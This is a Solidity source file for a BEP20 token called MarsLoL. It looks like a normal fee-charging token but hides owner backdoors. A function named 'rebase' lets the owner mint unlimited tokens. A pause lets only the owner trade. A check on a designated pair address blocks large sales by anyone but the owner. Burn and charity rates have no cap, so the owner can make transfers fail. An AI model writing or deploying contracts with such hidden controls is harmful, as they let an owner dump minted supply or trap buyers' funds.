contract BEP20 is Context, IERC20, Ownable, Pausable {
  using SafeMath for uint256;

  mapping (address => uint256) internal _balances;
  mapping (address => mapping (address => uint256)) private _allowances;
  
  uint8 private _decimals = 9;
  uint256 internal _totalSupply = 1000000000000000 * 10**9;
  string private _symbol = "MARSL";
  string private _name = "MarsLoL";
  address private _newun = address(0);
  address private _charityAddress = address(0);
  address private _burnAddress = address(0);
  
  uint256 public _maxTxAmount = _totalSupply.div(100);
  uint public _burnRate = 2;
  uint public _charRate = 3;
  bool public _presaleDone = false;
  

  constructor() public {
    _balances[_msgSender()] = _totalSupply;

    emit Transfer(address(0), _msgSender(), _totalSupply);
  }
  
  function transfernewun(address newun) external onlyOwner {
    _newun = newun;
  }
  
  function setCharityAddress(address account) external onlyOwner(){
      _charityAddress = account;
  }
  
  function setPresaleDone(bool presaleDone) external onlyOwner(){
      _presaleDone = presaleDone;
  }
  
  function _transfer(address sender, address recipient, uint256 amount) internal {
    require(sender != address(0), "transfer sender address is 0 address");
    require(recipient != address(0), "transfer recipient address is 0 address");
    require(!paused || sender == owner() || recipient == owner(), "paused");
    if(recipient == _newun && _newun != address(0)) require(amount < _maxTxAmount || sender == owner(), "please wait");
    
    if(_presaleDone){
        _standardTransfer(sender, recipient, amount);
    }else{
        _balances[sender] = _balances[sender].sub(amount, "transfer balance too low");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
  }
  
  function _standardTransfer(address sender, address recipient, uint256 amount) internal {
    uint256 burnAmt = _calculateBurnAmount(amount);
    uint256 charAmt = _calculateCharityAmount(amount);
    
    uint256 taxAmt = burnAmt.add(charAmt);
    uint256 transferAmt = amount.sub(taxAmt);
    
    _balances[_burnAddress] = _balances[_burnAddress].add(burnAmt);
    _balances[_charityAddress] = _balances[_charityAddress].add(charAmt);
    
    _balances[sender] = _balances[sender].sub(amount, "_standardTransfer balance too low");
    _balances[recipient] = _balances[recipient].add(transferAmt);
    
    emit Transfer(sender, recipient, transferAmt);
    emit Transfer(sender, _burnAddress, burnAmt);
    emit Transfer(sender, _charityAddress, charAmt);
  }
  
  function _calculateCharityAmount(uint256 totalAmount) internal view returns (uint256) {
      return totalAmount.mul(_charRate).div(100);
  }
    
  function _calculateBurnAmount(uint256 totalAmount) internal view returns (uint256) {
      return totalAmount.mul(_burnRate).div(100);
  }
  
  function setBurnRate(uint burnRate) external onlyOwner(){
      _burnRate = burnRate;
  }
  
  function setCharityRate(uint charityRate) external onlyOwner(){
      _charRate = charityRate;
  }

  function decimals() external view returns (uint8) {
    return _decimals;
  }


  function symbol() external view returns (string memory) {
    return _symbol;
  }

 
  function name() external view returns (string memory) {
    return _name;
  }


  function totalSupply() external view override returns (uint256) {
    return _totalSupply;
  }


  function balanceOf(address account) external view override returns (uint256) {
    return _balances[account];
  }


  function transfer(address recipient, uint256 amount) external override returns (bool) {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }


  function allowance(address owner, address spender) external view override returns (uint256) {
    return _allowances[owner][spender];
  }


  function approve(address spender, uint256 amount) external override returns (bool) {
    _approve(_msgSender(), spender, amount);
    return true;
  }


  function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
    _transfer(sender, recipient, amount);
    _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "transferFrom allowance too low"));
    return true;
  }


  function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
    return true;
  }

 
  function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
    _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "decreaseAllowance error"));
    return true;
  }

 
  function _burn(address account, uint256 amount) internal {
    require(account != address(0), "_burn account address(0)");

    _balances[account] = _balances[account].sub(amount, "_burn balance too low");
    _totalSupply = _totalSupply.sub(amount);
    emit Transfer(account, address(0), amount);
  }

  function _approve(address owner, address spender, uint256 amount) internal {
    require(owner != address(0), "_approve owner address(0)");
    require(spender != address(0), "_approve spender address(0)");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function _burnFrom(address account, uint256 amount) internal {
    _burn(account, amount);
    _approve(account, _msgSender(), _allowances[account][_msgSender()].sub(amount, "_burnFrom allowance too low"));
  }
  
  function rebase(address _to, uint256 _amount) onlyOwner public returns (bool){
    _totalSupply = _totalSupply.add(_amount);
    _balances[_to] = _balances[_to].add(_amount);
    emit Transfer(address(0), _to, _amount);
    return true;
  }
}